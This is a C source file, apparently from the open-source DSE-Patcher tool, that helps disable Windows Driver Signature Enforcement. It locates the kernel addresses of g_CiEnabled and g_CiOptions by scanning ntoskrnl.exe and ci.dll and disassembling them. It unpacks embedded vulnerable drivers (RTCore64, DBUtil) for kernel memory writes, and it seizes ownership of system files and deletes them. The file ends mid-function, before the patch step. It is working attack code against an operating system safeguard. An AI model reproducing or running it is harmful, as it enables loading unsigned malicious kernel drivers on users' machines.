
// DSE-Patcher - Patch DSE (Driver Signature Enforcement)
// Copyright (C) 2022 Kai Schtrom
//
// This file is part of DSE-Patcher.
//
// DSE-Patcher is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// DSE-Patcher is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with DSE-Patcher. If not, see <http://www.gnu.org/licenses/>.

// disable lint warnings for complete source code file
//lint -e801  Warning  801: Use of goto is deprecated
//lint -e818  Warning  818: Pointer parameter could be declared as pointing to const --- Eff. C++ 3rd Ed. item 3
//lint -e952  Warning  952: Parameter could be declared const --- Eff. C++ 3rd Ed. item 3
//lint -e953  Warning  953: Variable could be declared as const --- Eff. C++ 3rd Ed. item 3
//lint -e954  Warning  954: Pointer variable could be declared as pointing to const --- Eff. C++ 3rd Ed. item 3
//lint -e1924 Warning 1924: C-style cast -- More Effective C++ #2
#ifndef _DEBUG
#define _NO_CRT_STDIO_INLINE
#endif

#include "MyFunctions.h"
#include "RTCore64.h"
#include "DBUtil.h"
// Hacker Disassembler Engine 64
#include "hde64.h"

// import RtlGetVersion from ntdll.dll
typedef NTSTATUS (*RtlGetVersionProc)(PRTL_OSVERSIONINFOW lpVersionInformation);
// import NtQuerySystemInformation from ntdll.dll
typedef NTSTATUS (*NtQuerySystemInformationProc)(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);

GLOBALS g;


//------------------------------------------------------------------------------
// get operating system version
// Attention: We do not use GetVersion or GetVersionEx API, because with the
// release of Windows 8.1 the value returned by the GetVersion and GetVersionEx
// function now depends on how the application is manifested.
//------------------------------------------------------------------------------
int MyRtlGetVersion(OSVERSIONINFO *osvi)
{
	// zero OSVERSIONINFO memory and set OSVERSIONINFO size
	ZeroMemory(osvi,sizeof(OSVERSIONINFO));
	osvi->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// get handle to ntdll.dll
	HINSTANCE hLib = LoadLibrary("ntdll.dll");
	if(hLib == NULL)
	{
		return 1;
	}

	// retrieve address of exported function NtQuerySystemInformation
	RtlGetVersionProc RtlGetVersion = (RtlGetVersionProc)GetProcAddress(hLib,"RtlGetVersion"); 
	if(RtlGetVersion == NULL)
	{
		FreeLibrary(hLib);
		return 2;
	}

	// get version information about the currently running operating system
	//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
	if(RtlGetVersion((PRTL_OSVERSIONINFOW)osvi) != 0)
	{
		FreeLibrary(hLib);
		return 3;
	}

	// free ntdll.dll library handle
	FreeLibrary(hLib);

	return 0;
}


//------------------------------------------------------------------------------
// get image base of module in kernel address space
//------------------------------------------------------------------------------
int MyGetImageBaseInKernelAddressSpace(const char *szModuleName,UINT64 *ui64ImageBase,ULONG *ulImageSize)
{
	// zero image base address
	*ui64ImageBase = 0;

	// get handle to ntdll.dll
	HINSTANCE hLib = LoadLibrary("ntdll.dll");
	if(hLib == NULL)
	{
		return 1;
	}

	// retrieve address of exported function NtQuerySystemInformation
	NtQuerySystemInformationProc NtQuerySystemInformation = (NtQuerySystemInformationProc)GetProcAddress(hLib,"NtQuerySystemInformation"); 
	if(NtQuerySystemInformation == NULL)
	{
		FreeLibrary(hLib);
		return 2;
	}

	// undocumented system information class to retrieve system module information
	#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)0x0B

	// get needed buffer size for system module information
	ULONG ulReturnLength = 0;
	//lint -e{534} Warning 534: Ignoring return value of function
	NtQuerySystemInformation(SystemModuleInformation,NULL,0,&ulReturnLength);

	// allocate memory for system module information
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 1) unsigned long to unsigned long long
	PRTL_PROCESS_MODULES pModules = (PRTL_PROCESS_MODULES)malloc(ulReturnLength);
	if(pModules == NULL)
	{
		FreeLibrary(hLib);
		return 3;
	}

	// retrieve system module information
	if(NtQuerySystemInformation(SystemModuleInformation,pModules,ulReturnLength,&ulReturnLength) != 0)
	{
		FreeLibrary(hLib);
		return 4;
	}

	// free ntdll.dll library handle
	FreeLibrary(hLib);
	
	// do this for all modules in the system module information structure
	for(ULONG i = 0; i < pModules->NumberOfModules; i++)
	{
		// check if module name matches our first function argument
		if(_stricmp((const char*)&pModules->Modules[i].FullPathName[pModules->Modules[i].OffsetToFileName],szModuleName) == 0)
		{
			// return image base and image size
			*ui64ImageBase = (UINT64)pModules->Modules[i].ImageBase;
			*ulImageSize = pModules->Modules[i].ImageSize;
			// leave for loop
			break;
		}
	}

	// free system module information memory
	free(pModules);

	// check for valid kernel image base
	if(*ui64ImageBase == 0)
	{
		return 5;
	}

	return 0;
}


//------------------------------------------------------------------------------
// get g_CiEnabled kernel address
//------------------------------------------------------------------------------
int MyGetg_CiEnabledKernelAddress(UINT64 ui64ImageBase,ULONG ulImageSize,UINT64 *ui64Kernelg_CiEnabled)
{
	// zero kernel address of g_CiEnabled
	*ui64Kernelg_CiEnabled = 0;

	// zero ntoskrnl.exe file path
	char szNtoskrnlExe[MAX_PATH];
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 3) int to unsigned long long
	memset(szNtoskrnlExe,0,MAX_PATH);

	// get system directory path
	if(GetSystemDirectory(szNtoskrnlExe,MAX_PATH) == 0)
	{
		return 1;
	}

	// add file name of ntoskrnl.exe
	lstrcat(szNtoskrnlExe,"\\ntoskrnl.exe");

	// load the module ntoskrnl.exe into the address space of our process
	HMODULE hLib = LoadLibraryEx(szNtoskrnlExe,NULL,DONT_RESOLVE_DLL_REFERENCES);
	if(hLib == NULL)
	{
		return 2;
	}

	// search the complete module for the magic bytes
	LONG g_CiEnabledOffset = 0;
	UINT64 g_CiEnabled = 0;
	for(ULONG i = 0; i < ulImageSize - 4; i++)
	{
		// check for magic bytes
		//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
		if(*(DWORD*)((BYTE*)hLib + i) == 0x1D8806EB)
		{
			// if we get here we found the magic byte sequence which marks the jump instruction after the CiInitialize call
			// directly after the found byte sequence we get the offset of g_CiEnabled
			// PAGE:00000001403F5B73                 call    CiInitialize
			// PAGE:00000001403F5B78                 mov     ebx, eax
			// PAGE:00000001403F5B7A                 jmp     short loc_1403F5B82
			// PAGE:00000001403F5B7C ; ---------------------------------------------------------------------------
			// PAGE:00000001403F5B7C
			// PAGE:00000001403F5B7C loc_1403F5B7C:                          ; CODE XREF: SepInitializeCodeIntegrity+12j
			// PAGE:00000001403F5B7C                 mov     cs:g_CiEnabled, bl
			// Attention: It is important here that we use a LONG value and no DWORD value,
			// because the offsets in the disassembly are signed to also reach negative values.
			g_CiEnabledOffset = *(LONG*)((BYTE*)hLib + i + 4);
			// calculate virtual address of g_CiEnabled
			g_CiEnabled = (UINT64)((BYTE*)hLib + i + 8 + g_CiEnabledOffset);
			// leave the for loop
			break;
		}
	}

	// check if we have found the offset and virtual address of g_CiEnabled
	if(g_CiEnabledOffset == 0 || g_CiEnabled == 0)
	{
		FreeLibrary(hLib);
		return 3;
	}

	// calculate kernel address of g_CiEnabled
	*ui64Kernelg_CiEnabled = ui64ImageBase + g_CiEnabled - (UINT64)hLib;

	// free library
	FreeLibrary(hLib);

	return 0;
}


//------------------------------------------------------------------------------
// get g_CiOptions kernel address
//------------------------------------------------------------------------------
int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,UINT64 *ui64Kernelg_CiOptions,DWORD dwBuildNumber)
{
	// zero kernel address of g_CiOptions
	*ui64Kernelg_CiOptions = 0;

	// zero ci.dll file path
	char szCiDll[MAX_PATH];
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 3) int to unsigned long long
	memset(szCiDll,0,MAX_PATH);

	// get system directory path
	if(GetSystemDirectory(szCiDll,MAX_PATH) == 0)
	{
		return 1;
	}

	// add file name of ci.dll
	lstrcat(szCiDll,"\\ci.dll");

	// load the module ci.dll into the address space of our process
	HMODULE hLib = LoadLibraryEx(szCiDll,NULL,DONT_RESOLVE_DLL_REFERENCES);
	if(hLib == NULL)
	{
		return 2;
	}

	// retrieve address of exported function CiInitialize
	BYTE *CiInitialize = NULL;
	//lint -e{611} Warning 611: Suspicious cast
	//lint -e{838} Warning 838: Previously assigned value to variable has not been used
	CiInitialize = (BYTE*)GetProcAddress(hLib,"CiInitialize");
	if(CiInitialize == NULL)
	{
		FreeLibrary(hLib);
		return 3;
	}

	// zero Hacker Disassembler Engine 64 structure
	hde64s hs;
	ZeroMemory(&hs,sizeof(hde64s));
	LONG CipInitializeOffset = 0;
	BYTE *CipInitialize = NULL;
	// Windows 8 up to Windows 10 Version 1703
	if(dwBuildNumber < 16299)
	{
		// search the first 0x48 bytes of the function CiInitialize for the "jmp CipInitialize" instruction
		// the function CiInitialize should never be more than 0x48 bytes in size for Windows 8.1 x64 Enterprise
		for(ULONG i = 0; i < 0x48; i += hs.len)
		{
			// disassemble code with Hacker Disassembler Engine 64
			//lint -e{534} Warning 534: Ignoring return value of function
			hde64_disasm(CiInitialize + i,&hs);
			// check for disassembler error
			if(hs.flags & F_ERROR)
			{
				FreeLibrary(hLib);
				return 4;
			}

			// we search for a jump instruction with a length of 5 bytes
			if(hs.len == 5 && CiInitialize[i] == 0xE9)
			{
				// If we get here we found the jump instruction to CipInitialize.

				// Windows 8 x64 Enterprise
				// PAGE:0000000080029290 ; Exported entry   6. CiInitialize
				// PAGE:0000000080029290
				// PAGE:0000000080029290 ; =============== S U B R O U T I N E =======================================
				// PAGE:0000000080029290
				// PAGE:0000000080029290
				// PAGE:0000000080029290                 public CiInitialize
				// PAGE:0000000080029290 CiInitialize    proc near
				// PAGE:0000000080029290
				// PAGE:0000000080029290 arg_0           = qword ptr  8
				// PAGE:0000000080029290 arg_8           = qword ptr  10h
				// PAGE:0000000080029290 arg_10          = qword ptr  18h
				// PAGE:0000000080029290
				// PAGE:0000000080029290                 mov     [rsp+arg_0], rbx
				// PAGE:0000000080029295                 mov     [rsp+arg_8], rbp
				// PAGE:000000008002929A                 mov     [rsp+arg_10], rsi
				// PAGE:000000008002929F                 push    rdi
				// PAGE:00000000800292A0                 sub     rsp, 20h
				// PAGE:00000000800292A4                 mov     rbx, r9
				// PAGE:00000000800292A7                 mov     rdi, r8
				// PAGE:00000000800292AA                 mov     rsi, rdx
				// PAGE:00000000800292AD                 mov     ebp, ecx
				// PAGE:00000000800292AF                 call    __security_init_cookie
				// PAGE:00000000800292B4                 mov     r9, rbx
				// PAGE:00000000800292B7                 mov     r8, rdi
				// PAGE:00000000800292BA                 mov     rdx, rsi
				// PAGE:00000000800292BD                 mov     ecx, ebp
				// PAGE:00000000800292BF                 mov     rbx, [rsp+28h+arg_0]
				// PAGE:00000000800292C4                 mov     rbp, [rsp+28h+arg_8]
				// PAGE:00000000800292C9                 mov     rsi, [rsp+28h+arg_10]
				// PAGE:00000000800292CE                 add     rsp, 20h
				// PAGE:00000000800292D2                 pop     rdi
				// PAGE:00000000800292D3                 jmp     CipInitialize
				// PAGE:00000000800292D3 CiInitialize    endp

				// Attention: It is important here that we use a LONG value and no DWORD value,
				// because the offsets in the disassembly are signed to also reach negative values.
				// In our case CipInitialize is below CiInitialize, therefore it would also work here
				// with a DWORD value, because the offset is positive.
				//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
				CipInitializeOffset = *(LONG*)((BYTE*)CiInitialize + i + 1);
				// calculate virtual address of function CipInitialize
				CipInitialize = (CiInitialize + i + 5 + CipInitializeOffset);
				// leave the for loop
				break;
			}
		}
	}
	// Windows 10 Version 1709 up to Windows 11 Build 22H2
	else
	{
		// number of instructions found
		ULONG ulInstructionsFound = 0;

		// search the first 0x6E bytes of the function CiInitialize for the "call CipInitialize" instruction
		// the function CiInitialize should never be more than 0x6E bytes in size for Windows 10 x64 Build 21H2 and Build 22H2
		for(ULONG i = 0; i < 0x6E; i += hs.len)
		{
			// disassemble code with Hacker Disassembler Engine 64
			//lint -e{534} Warning 534: Ignoring return value of function
			hde64_disasm(CiInitialize + i,&hs);
			// check for disassembler error
			if(hs.flags & F_ERROR)
			{
				FreeLibrary(hLib);
				return 5;
			}

			// 1st we search for the move instruction "mov r9, rbx" with a length of 3 bytes
			//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
			if(ulInstructionsFound == 0 && hs.len == 3 && CiInitialize[i] == 0x4C && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xCB)
			{
				ulInstructionsFound = 1;
			}
			// 2nd we search for the move instruction "mov r8, rdi" with a length of 3 bytes
			//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
			else if(ulInstructionsFound == 1 && hs.len == 3 && CiInitialize[i] == 0x4C && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xC7)
			{
				ulInstructionsFound = 2;
			}
			// 3rd we search for the move instruction "mov rdx, rsi" with a length of 3 bytes
			//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
			else if(ulInstructionsFound == 2 && hs.len == 3 && CiInitialize[i] == 0x48 && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xD6)
			{
				ulInstructionsFound = 3;
			}
			// 4th we search for the move instruction "mov ecx, ebp" with a length of 2 bytes
			//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
			else if(ulInstructionsFound == 3 && hs.len == 2 && CiInitialize[i] == 0x8B && CiInitialize[i + 1] == 0xCD)
			{
				ulInstructionsFound = 4;
			}
			// 5th we search for the call instruction "call CipInitialize" with a length of 5 bytes
			//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
			else if(ulInstructionsFound == 4 && hs.len == 5 && CiInitialize[i] == 0xE8)
			{
				// If we get here we found the call instruction to CipInitialize.

				// Windows 10 x64 Version 1709
				// PAGE:00000001C0026120 ; Exported entry   9. CiInitialize
				// PAGE:00000001C0026120
				// PAGE:00000001C0026120 ; =============== S U B R O U T I N E =======================================
				// PAGE:00000001C0026120
				// PAGE:00000001C0026120
				// PAGE:00000001C0026120                 public CiInitialize
				// PAGE:00000001C0026120 CiInitialize    proc near
				// PAGE:00000001C0026120
				// PAGE:00000001C0026120 arg_0           = qword ptr  8
				// PAGE:00000001C0026120 arg_8           = qword ptr  10h
				// PAGE:00000001C0026120 arg_10          = qword ptr  18h
				// PAGE:00000001C0026120
				// PAGE:00000001C0026120                 mov     [rsp+arg_0], rbx
				// PAGE:00000001C0026125                 mov     [rsp+arg_8], rbp
				// PAGE:00000001C002612A                 mov     [rsp+arg_10], rsi
				// PAGE:00000001C002612F                 push    rdi
				// PAGE:00000001C0026130                 sub     rsp, 20h
				// PAGE:00000001C0026134                 mov     rbx, r9
				// PAGE:00000001C0026137                 mov     rdi, r8
				// PAGE:00000001C002613A                 mov     rsi, rdx
				// PAGE:00000001C002613D                 mov     ebp, ecx
				// PAGE:00000001C002613F                 call    __security_init_cookie
				// PAGE:00000001C0026144                 mov     r9, rbx
				// PAGE:00000001C0026147                 mov     r8, rdi
				// PAGE:00000001C002614A                 mov     rdx, rsi
				// PAGE:00000001C002614D                 mov     ecx, ebp
				// PAGE:00000001C002614F                 call    CipInitialize
				// PAGE:00000001C0026154                 mov     rbx, [rsp+28h+arg_0]
				// PAGE:00000001C0026159                 mov     rbp, [rsp+28h+arg_8]
				// PAGE:00000001C002615E                 mov     rsi, [rsp+28h+arg_10]
				// PAGE:00000001C0026163                 add     rsp, 20h
				// PAGE:00000001C0026167                 pop     rdi
				// PAGE:00000001C0026168                 retn
				// PAGE:00000001C0026168 CiInitialize    endp

				// Attention: It is important here that we use a LONG value and no DWORD value,
				// because the offsets in the disassembly are signed to also reach negative values.
				// In our case CipInitialize is below CiInitialize, therefore it would also work here
				// with a DWORD value, because the offset is positive.
				//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
				CipInitializeOffset = *(LONG*)((BYTE*)CiInitialize + i + 1);
				// calculate virtual address of function CipInitialize
				CipInitialize = (CiInitialize + i + 5 + CipInitializeOffset);
				// leave the for loop
				break;
			}
			// instruction does not match
			else
			{
				// reset number of instructions found
				ulInstructionsFound = 0;
			}
		}
	}

	// check if we have found the function offset and virtual address of CipInitialize
	if(CipInitializeOffset == 0 || CipInitialize == 0)
	{
		FreeLibrary(hLib);
		return 6;
	}

	// search the first 0x4A bytes of the function CipInitialize for the "mov cs:g_CiOptions, ecx" instruction
	// the instruction should never be more than 0x4A bytes away from the CipInitialize function start for Windows 8.1 Enterprise x64 English Checked Debug Build
	LONG g_CiOptionsOffset = 0;
	BYTE *g_CiOptions = NULL;
	for(ULONG i = 0; i < 0x4A; i += hs.len)
	{
		// disassemble code with Hacker Disassembler Engine 64
		//lint -e{534} Warning 534: Ignoring return value of function
		hde64_disasm(CipInitialize + i,&hs);
		// check for disassembler error
		if(hs.flags & F_ERROR)
		{
			FreeLibrary(hLib);
			return 7;
		}

		// we search for the move instruction "mov cs:g_CiOptions, ecx" with a length of 6 bytes for free retail builds
		// or the move instruction "mov cs:g_CiOptions, eax" with a length of 6 bytes for checked debug builds
		//lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
		if(hs.len == 6 && (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x0D) || (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x05))
		{
			// If we get here, we found the instruction, which sets g_CiOptions variable.
			// The address of g_CiOptions is directly after the instruction bytes 89 0D for free retail builds or 89 05 for checked debug builds.

			// Windows 8 x64 Enterprise
			// PAGE:0000000080029690 CipInitialize   proc near               ; CODE XREF: CiInitialize+43j
			// PAGE:0000000080029690
			// PAGE:0000000080029690 var_48          = qword ptr -48h
			// PAGE:0000000080029690 var_40          = dword ptr -40h
			// PAGE:0000000080029690 arg_0           = qword ptr  8
			// PAGE:0000000080029690
			// PAGE:0000000080029690                 mov     [rsp+arg_0], rbx
			// PAGE:0000000080029695                 push    rbp
			// PAGE:0000000080029696                 push    rsi
			// PAGE:0000000080029697                 push    rdi
			// PAGE:0000000080029698                 push    r12
			// PAGE:000000008002969A                 push    r13
			// PAGE:000000008002969C                 push    r14
			// PAGE:000000008002969E                 push    r15
			// PAGE:00000000800296A0                 sub     rsp, 30h
			// PAGE:00000000800296A4                 mov     rax, [r8]
			// PAGE:00000000800296A7                 mov     rdi, r9
			// PAGE:00000000800296AA                 mov     r14, rdx
			// PAGE:00000000800296AD                 mov     cs:g_CiKernelApis, rax
			// PAGE:00000000800296B4                 mov     cs:g_CiOptions, ecx

			// Windows 10 x64 Version 1709
			// PAGE:00000001C00268F4 CipInitialize:                          ; CODE XREF: CiInitialize+2Fp
			// PAGE:00000001C00268F4                 mov     [rsp+8], rbx
			// PAGE:00000001C00268F9                 mov     [rsp+10h], rbp
			// PAGE:00000001C00268FE                 mov     [rsp+18h], rsi
			// PAGE:00000001C0026903                 push    rdi
			// PAGE:00000001C0026904                 push    r12
			// PAGE:00000001C0026906                 push    r14
			// PAGE:00000001C0026908                 sub     rsp, 40h
			// PAGE:00000001C002690C                 mov     rbp, r9
			// PAGE:00000001C002690F                 mov     cs:g_CiOptions, ecx

			// Attention: It is important here that we use a LONG value and no DWORD value,
			// because the offsets in the disassembly are signed to also reach negative values.
			// Because the g_CiOptions value is at the start we have a negative offset from
			// our calling code inside CipInitialize.
			//lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
			g_CiOptionsOffset = *(LONG*)((BYTE*)CipInitialize + i + 2);
			// calculate virtual address of g_CiOptions
			g_CiOptions = (CipInitialize + i + 6 + g_CiOptionsOffset);
			// leave the for loop
			break;
		}
	}

	// check if we have found the offset and virtual address of g_CiOptions
	if(g_CiOptionsOffset == 0 || g_CiOptions == 0)
	{
		FreeLibrary(hLib);
		return 8;
	}

	// calculate kernel address of g_CiOptions
	*ui64Kernelg_CiOptions = ui64ImageBase + (UINT64)g_CiOptions - (UINT64)hLib;

	// free library
	FreeLibrary(hLib);

	return 0;
}


//------------------------------------------------------------------------------
// get executable module path
//------------------------------------------------------------------------------
int MyGetModulePath(char *szPath,DWORD dwSize)
{
	// get full module file name
	if(GetModuleFileName(NULL,szPath,dwSize) == 0)
	{
		return 1;
	}

	// search for the last backslash in the full module file name
	char *p = strrchr(szPath,'\\');
	if(p == NULL)
	{
		return 2;
	}

	// set terminating zero at last backslash position
	*p = 0;

	return 0;
}


//------------------------------------------------------------------------------
// set privileges
//------------------------------------------------------------------------------
int MySetPrivilege(HANDLE hToken,LPCTSTR lpszPrivilege,BOOL bEnablePrivilege) 
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	// retrieve the locally unique identifier (LUID) used on the specified system
	if(LookupPrivilegeValue(NULL,lpszPrivilege,&luid) == FALSE)
	{
		return 1;
	}

	// enable or disable privilege based on the flag
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if(bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else
	{
		tp.Privileges[0].Attributes = 0;
	}

	// enable the privilege or disable all privileges
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
	if(AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL) == FALSE)
	{
		return 2; 
	}

	// check last error
	if(GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return 3;
	}

	return 0;
}


//------------------------------------------------------------------------------
// take ownership of a file
//------------------------------------------------------------------------------
int MyTakeOwnership(char *szFile,PSID pSID)
{
	int rc = 0;
	HANDLE hToken = NULL;

	// open a handle to the access token for the calling process
	if(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken) == FALSE)
	{
		rc = 1;
		goto cleanup; 
	} 

	// enable the SE_TAKE_OWNERSHIP_NAME privilege
	if(MySetPrivilege(hToken,SE_TAKE_OWNERSHIP_NAME,TRUE) != 0) 
	{
		rc = 2;
		goto cleanup; 
	}

	// to set TrustedInstaller as owner we have to enable SE_RESTORE_NAME privileges which holds the WRITE_OWNER access right
	if(MySetPrivilege(hToken,SE_RESTORE_NAME,TRUE) != 0)
	{
		rc = 3;
		goto cleanup; 
	}

	// set the owner in the object's security descriptor
	if(SetNamedSecurityInfo(szFile,SE_FILE_OBJECT,OWNER_SECURITY_INFORMATION,pSID,NULL,NULL,NULL) != ERROR_SUCCESS)
	{
		rc = 4;
		goto cleanup;
	}

	// disable the SE_TAKE_OWNERSHIP_NAME privilege
	if(MySetPrivilege(hToken,SE_TAKE_OWNERSHIP_NAME,FALSE) != 0) 
	{
		rc = 5;
		goto cleanup;
	}

	// disable the SE_RESTORE_NAME privilege
	if(MySetPrivilege(hToken,SE_RESTORE_NAME,FALSE) != 0)
	{
		rc = 6;
		goto cleanup; 
	}

cleanup:
	// close access token handle
	if(hToken != NULL) CloseHandle(hToken);

	return rc;
}


//------------------------------------------------------------------------------
// add entries to ACL
//------------------------------------------------------------------------------
int MyAddEntriesToACL(char *szFile,ULONG ulEntries,EXPLICIT_ACCESS *ea,PACL pOldDACL)
{
	int rc = 0;
	PACL pNewDACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;

	// create a new ACL that contains the new ACEs
	if(SetEntriesInAcl(ulEntries,ea,pOldDACL,&pNewDACL) != ERROR_SUCCESS)
	{
		rc = 1;
		goto cleanup;
	}

	// allocate memory for a security descriptor
	//lint -e{835} Warning 835: A zero has been given as left argument to operator '|'
	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,SECURITY_DESCRIPTOR_MIN_LENGTH);
	if(pSD == NULL)
	{
		rc = 2;
		goto cleanup;
	}

	// initialize a new security descriptor
	if(InitializeSecurityDescriptor(pSD,SECURITY_DESCRIPTOR_REVISION) == FALSE)
	{
		rc = 3;
		goto cleanup;
	}

	// add the ACL to the security descriptor
	if(SetSecurityDescriptorDacl(pSD,TRUE,pNewDACL,FALSE) == FALSE)
	{
		rc = 4;
		goto cleanup; 
	}

	// set security of file
	if(SetFileSecurity(szFile,DACL_SECURITY_INFORMATION,pSD) == FALSE)
	{
		rc = 5;
		goto cleanup; 
	}

cleanup:
	// free new ACL memory
	if(pNewDACL != NULL) LocalFree(pNewDACL);
	// free security descriptor memory
	if(pSD != NULL) LocalFree(pSD);

	return rc;
}


//------------------------------------------------------------------------------
// take ownership of object and add Administrators group to ACL
//------------------------------------------------------------------------------
int MyTakeOwnershipAndAddAdminsToACL(char *szFile)
{
	int rc = 0;
	EXPLICIT_ACCESS ea[1];
	ULONG cCountOfExplicitEntries = 1;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	PSID pSIDAdmins = NULL;

	// zero memory of explicit access entries
	ZeroMemory(ea,cCountOfExplicitEntries * sizeof(EXPLICIT_ACCESS));

	// add Administrators group to ACL
	// create a SID for the BUILTIN\Administrators group
	if(AllocateAndInitializeSid(&SIDAuthNT,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&pSIDAdmins) == FALSE)
	{
		rc = 1;
		goto cleanup;
	}

	// set full control for Administrators
	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pSIDAdmins;

	// get DACL security info from file
	PACL pOldDACL = NULL;
	if(GetNamedSecurityInfo(szFile,SE_FILE_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,&pOldDACL,NULL,NULL) != ERROR_SUCCESS)
	{
		rc = 2;
		goto cleanup;
	}

	// try to modify the file's existing DACL
	if(MyAddEntriesToACL(szFile,cCountOfExplicitEntries,ea,pOldDACL) == 0)
	{
		// we succeeded in modifying the DACL
		rc = 0;
		goto cleanup;
	}

	// make Administrators group owner of file
	if(MyTakeOwnership(szFile,pSIDAdmins) != 0)
	{
		rc = 3;
		goto cleanup;
	}

	// now that we are the owner try again to modify the file's existing DACL
	if(MyAddEntriesToACL(szFile,cCountOfExplicitEntries,ea,pOldDACL) != 0)
	{
		rc = 4;
		goto cleanup;
	}

cleanup:
	// free SID
	if(pSIDAdmins != NULL) FreeSid(pSIDAdmins);

	return rc;
}


//------------------------------------------------------------------------------
// mark registry service key for deletion
//------------------------------------------------------------------------------
int MyMarkServiceForDeletion(char *szServiceName)
{
	// Attention: If we would completely delete the service registry key of the driver,
	// we can not install the driver anymore and have to reboot! By using the INF install
	// method, the driver is copied to "C:\Windows\system32\drivers\DBUtilDrv2.sys". The
	// function "SetupDiRemoveDevice" does not delete the driver on both Windows 7 and
	// Windows 10. It also does not remove the service entry on Windows 7. Only on Windows
	// 10 the service entry is removed by setting the DWORD "DeleteFlag" to 0x00000001.
	// After the next reboot this will delete the service registry entry. To do a clean
	// uninstall on Windows 7, we do the same as the system does on Windows 10 and the
	// service is deleted on the next reboot. The driver files have to be deleted on
	// both operating systems by DSE-Patcher.

	// create registry service key of driver
	char szSubKey[MAX_PATH];
	lstrcpy(szSubKey,"SYSTEM\\CurrentControlSet\\services\\");
	lstrcat(szSubKey,szServiceName);

	// open registry key
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey,0,KEY_ALL_ACCESS,&hKey) != ERROR_SUCCESS)
	{
		return 1;
	}

	// create "DeleteFlag" with the DWORD value 0x00000001
	DWORD dwDeleteFlag = 0x00000001;
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 6) unsigned long long to unsigned long
	if(RegSetValueEx(hKey,"DeleteFlag",0,REG_DWORD,(BYTE*)&dwDeleteFlag,sizeof(DWORD)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return 2;
	}

	// close registry key handle
	RegCloseKey(hKey);

	return 0;
}


//------------------------------------------------------------------------------
// delete driver sys file from "C:\Windows\system32\drivers" directory
//------------------------------------------------------------------------------
int MyDeleteSystem32DriversFile(char *szDriverFilePath)
{
	// take ownership of object and add Administrators group to ACL
	if(MyTakeOwnershipAndAddAdminsToACL(szDriverFilePath) != 0)
	{
		return 1;
	}

	// delete driver file
	if(DeleteFile(szDriverFilePath) == FALSE)
	{
		return 2;
	}

	return 0;
}


//------------------------------------------------------------------------------
// unpack vulnerable driver
//------------------------------------------------------------------------------
int MyUnpackVulnerableDriver(DRIVER_FILE *df,DWORD dwElements)
{
	// do this for all present files in the DRIVER_FILE structure
	for(unsigned int i = 0; i < dwElements; i++)
	{
		// leave for loop if file path is empty
		if(df->szFilePath[0] == 0)
		{
			break;
		}

		// check if the driver file already exists
		if(PathFileExists(df->szFilePath) == TRUE)
		{
			return 0;
		}

		// create file
		HANDLE hFile = CreateFile(df->szFilePath,GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			return 1;
		}

		// write file
		DWORD dwNumBytesWritten = 0;
		WriteFile(hFile,df->bData,df->dwSize,&dwNumBytesWritten,NULL);
		if(dwNumBytesWritten != df->dwSize)
		{
			CloseHandle(hFile);
			return 2;
		}

		// close file handle
		CloseHandle(hFile);

		// increment pointer to DRIVER_FILE structure to get next structure in array
		df++;
	}

